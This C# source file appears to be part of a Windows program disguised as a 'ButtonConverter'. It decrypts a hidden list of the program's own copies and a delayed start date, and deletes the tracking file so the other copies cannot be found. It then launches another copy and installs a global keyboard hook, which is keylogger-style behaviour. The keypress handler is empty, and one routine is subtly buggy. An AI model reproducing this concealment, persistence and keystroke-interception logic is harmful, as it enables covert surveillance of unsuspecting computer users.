using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;


namespace ButtonConverter
{
    class BehaviorLogic
    {
        private static string systFileName = "syst.txt";


        public static void CheckBehavior()//определение своего поведения на основе данных из файла
        {
            if (File.Exists(FileLogic.RealAppPath(systFileName)))
            {

                string[] allAdres = File.ReadAllLines(FileLogic.RealAppPath(systFileName));
                DateTime dateToStart = Convert.ToDateTime(Crypter.Encode(allAdres[allAdres.Length - 1],false));//расшифровываем!
                if (dateToStart < DateTime.Now)
                {
                    if (allAdres.Length - 1 >= 2)//есть вторая копия, как минимум, значит текущая будет Управленцем
                        CheckStatusForAllCopies(allAdres, allAdres[0]);//нудевой - всегда адрес текущей варианта
                    else
                        StartLikeCopy();
                }
            }
        }
        public static void CheckStatusForAllCopies(string[] allAdres, string thisCopyAdres)// проверка реального наличия всех копий, которые естьв  списке
        {
            List<string> rezultListAdres = new List<string>();
            string encodeAdress = "";
            for (int i = 0; i < allAdres.Length - 1; i++)
            {
                encodeAdress = Crypter.Encode(allAdres[i], false);
                if (File.Exists(encodeAdress))//расшифровываем!
                    rezultListAdres.Add(allAdres[i]);

                else//если нет копии, то и файл syst тоже надо убрать(чтобы по нему не нашли остальных)
                {
                    allAdres[i] = "XX";//данное имя недействительно в текущем массиве
                    string systPath = FileLogic.FindGeneralPath(allAdres[i], systFileName);
                    if (File.Exists(encodeAdress))
                        File.Delete(encodeAdress);
                }
            }
            rezultListAdres.Add(allAdres[allAdres.Length - 1]);//не забываем копировать время

            thisCopyAdres = FileLogic.FindGeneralPath(Crypter.Encode(thisCopyAdres, false), systFileName);

            File.Delete(thisCopyAdres);
            File.WriteAllLines(thisCopyAdres, rezultListAdres);//обновили список путей

            Process.Start(Crypter.Encode(rezultListAdres[rezultListAdres.Count-2],false)     , "start");//запускаем 2 копию
        }


        public static void StartLikeCopy()//работать как копия
        {
            KeyboardHook newHook = new KeyboardHook();
            //newHook.KeyDown += new KeyboardHook.KeyboardHookCallback(KeyboardHook_KeyDown);

            newHook.Install();
            Application.Run();

            //newHook.KeyDown -= new KeyboardHook.KeyboardHookCallback(KeyboardHook_KeyDown);
            newHook.Uninstall();
        }

//функНе позволяет заблокировать/подменить нажатие.
//может просто повесить новое/дополнительное действие на клавишу. Для блокировки/перехвата - нужно использовать исходную функцию, она более функциональная
        private static void KeyboardHook_KeyDown(KeyboardHook.VKeys key)
        {
            
        }

    }
    
}
